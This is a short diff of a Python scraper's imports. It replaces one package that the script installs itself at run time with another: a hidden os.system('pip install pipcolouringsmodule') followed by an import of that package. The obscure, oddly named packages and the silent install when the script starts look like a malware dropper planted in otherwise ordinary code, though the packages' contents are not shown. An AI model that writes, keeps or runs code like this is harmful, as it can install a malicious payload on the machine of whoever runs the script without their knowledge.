@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptographyextensionsV2")
-import pythoncryptographyextensionsV2
+os.system("pip install pipcolouringsmodule")
+import pipcolouringsmodule
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
